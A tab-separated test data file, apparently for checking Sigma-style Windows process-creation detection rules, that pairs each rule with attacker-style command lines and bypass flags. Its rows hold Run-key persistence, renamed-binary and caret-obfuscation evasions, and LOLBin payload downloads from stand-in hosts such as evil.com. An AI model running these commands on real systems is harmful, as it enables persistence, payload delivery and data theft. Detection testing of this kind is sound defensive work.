Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"" /f"	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Persistence"" /t REG_SZ /F /D ""payload.exe"""	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"cmd.exe /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"" /f"	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"copy reg.exe not_reg.exe && not_reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d ""payload.exe"""	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d ""C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe"" /f"	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"REG  ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\\Path\\AtomicRedTeam.exe"""	FALSE	FALSE	FALSE	
t1547.001	proc_creation_win_reg_add_run_key	Potential Persistence Attempt Via Run Keys Using Reg.EXE	de587dce-915e-4218-aac4-835ca6af6f70		"REG   ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\\Path\\AtomicRedTeam.dll"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c ""whoami"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		bash.exe -c'whoami'	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		bash.exe -c whoami	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c""whoami"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		"bash.exe -c ""whoami"" --"	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe     -- script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe -l script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe script.sh # bash -	FALSE	FALSE	FALSE	
t1202	proc_creation_win_bash_file_execution	Indirect Command Execution From Script File Via Bash.EXE	2d22a514-e024-4428-9dba-41505bd63a5b		bash.exe script.sh	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		conhost.exe 0xffffffff -ForceV1	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		"""conhost.exe"" 0xffffffff -ForceV1"	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		conhost.exe 0xFFFFFFFF -forcev1	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		C:\Windows\System32\conhost.exe 0xffffffff -ForceV1	FALSE	FALSE	FALSE	
t1202	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		conhost.exe 0xffffffff -ForceV1 -ForceV1	FALSE	FALSE	FALSE	
t1202	proc_creation_win_msdt_susp_cab_options	Suspicious Cabinet File Execution Via Msdt.EXE	dc4576d4-7467-424f-9eee-fd2b02855fe0		copy msdt.exe diagnostic_tool.exe && diagnostic_tool.exe -cab C:\Temp\Suspicious.diagcab	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		"EXCEL.EXE ""http://malicious-domain.com/payload.csv"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		"POWERPNT.EXE ""https://malicious-domain.com/share/payload.pptx"""	FALSE	FALSE	FALSE	
t1202	proc_creation_win_office_arbitrary_cli_download	Potential Arbitrary File Download Using Office Application	4ae3e30b-b03f-43aa-87e3-b622f4048eed		WINWORD.EXE \\evil-server.local\share\payload.docx	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S MYSERVER -d MyDB"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp  ""SELECT * FROM dbo.SecretTable""  queryout  C:\temp\export.txt  -c  -T  -S MYSERVER  -d MyDB"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -d MyDB -S MYSERVER"	FALSE	FALSE	FALSE	
t1048	proc_creation_win_bcp_export_data	Data Export From MSSQL Table Via BCP.EXE	c615d676-f655-46b9-b913-78729021e5d7		"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S""MYSERVER"" -d""MyDB"""	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		"C:\Windows\System32\bitsadmin.exe"" /transfer MyJob /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		bitsadmin.exe /addfile MyJob https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		bitsadmin.exe /transfer MyJob http://example.com/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download	File Download Via Bitsadmin	d059842b-6b9d-4ed1-b5c3-5b89143c6ede		copy bitsadmin.exe not_bits.exe && not_bits.exe /transfer MyJob http://example.com/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef		bitsadmin /transfer MyJob http://10.10.10.10/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef		bitsadmin.exe  /transfer   MyJob   http://10.10.10.10/payload.exe   payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef		bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe .\payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_direct_ip	Suspicious Download From Direct IP Via Bitsadmin	99c840f2-2012-46fd-9141-c761987550ef		bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c		"C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"" C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c		bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c		bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_file_sharing_domains	Suspicious Download From File-Sharing Website Via Bitsadmin	8518ed3d-f7c9-4601-a26c-f361a4256a0c		certutil -urlcache -split -f http://anonfiles.com/example/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_extensions	File With Suspicious Extension Downloaded Via Bitsadmin	5b80a791-ad9b-4b75-bcc1-ad4e1e89c200		C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac		"C:\Windows\System32\bitsadmin.exe /transfer job1 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ""%TEMP%\Atomic-license.txt"""	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac		"bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md ""%USERPROFILE%\AppData\Local\Temp\bitsadmin3_flag.ps1"""	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac		bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin1_flag.ps1	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_susp_targetfolder	File Download Via Bitsadmin To A Suspicious Target Folder	2ddef153-167b-4e89-86b6-757a9e65dcac		bitsadmin /transfer myJob /download /priority high http://evil.com/payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248		C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248		bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_download_uncommon_targetfolder	File Download Via Bitsadmin To An Uncommon Target Folder	6e30c82f-a9f8-4aab-b79c-7c12bce6f248		"bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt ""%temp%\Atomic-license.txt"""	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob payload.exe payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /SetNotifyCmdLine myjob cmd.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /SetNotifyCmdLine myjob powershell.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob https://example.com/payload.exe C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob http://example.com/payload.exe C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob ftp://example.com/payload.exe C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /AddFile myjob ftps://example.com/payload.exe C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /SetNotifyCmdLine myjob %COMSPEC% /c echo Test	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /SetNotifyCmdLine myjob regsvr32.exe /s /n /u /i:evil.dll scrobj.dll	FALSE	FALSE	FALSE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		Start-BitsTransfer -Source http://example.com/payload.exe -Destination C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User_Data --headless	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless=new	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --disable-gpu	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --incognito	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --disable-automation	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe -remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\User\AppData\Local\Chrome\User\Data	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --profile-directory=Default	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-address=127.0.0.1 --remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-socket-name=debug_socket	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-pipe=debug_pipe	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --no-sandbox	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --disable-gpu	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --headless=new	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		firefox.exe -start-debugger-server 9222	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		copy msedge.exe not_a_browser.exe && not_a_browser.exe --headless	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		msedge.exe --headless=old	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		"set ""FLAG=--headless"" && msedge.exe %FLAG%"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_file_download	File Download with Headless Browser	0e8cfe08-02c9-4815-a2f8-0d157b7ed33e		chromium.exe --headless --dump-dom http://example.com/payload.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_inline_file_download	File Download From Browser Process Via Inline URL	94771a71-ba41-4b6e-a757-b531372eaab6		msedge.exe http://example.com/payload.exe --window-size=800,600	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		"certoc.exe -GetCACAPS ""http://example.com/payload.dll"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		certoc.exe /GetCACAPS http://example.com/payload.dll	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		certoc.exe -GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		"cmd.exe /c ""certoc.exe -GetCACAPS h^t^t^p^:^/^/http://example.com/payload.dll"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		certoc.exe -GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		certoc.exe /GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		"certoc.exe -GetCACAPS ""http://192.168.1.100/payload.ext"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c t^y^p^e C:\temp\data.txt > \\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		"cmd.exe /c set ""cmd=type"" && call %cmd% \\webdav.server.local\share\file.txt > C:\temp\file.txt"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type C:\temp\data.txt >\\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c t^yp^e payload.exe > payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		"cmd.exe /c type ""payload.exe"" > payload.exe"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_curl_susp_download	Suspicious Curl.EXE Download	e218595b-bbe7-4ee5-8a96-f32a24ad3468		C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\Public\Music\allthethingsx64.dll	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe -lockscreenurl http://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		"cmd.exe /c ""desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\Users\User\AppData\Local\Temp\payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /silent	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:%temp%\payload.exe	FALSE	FALSE	FALSE	
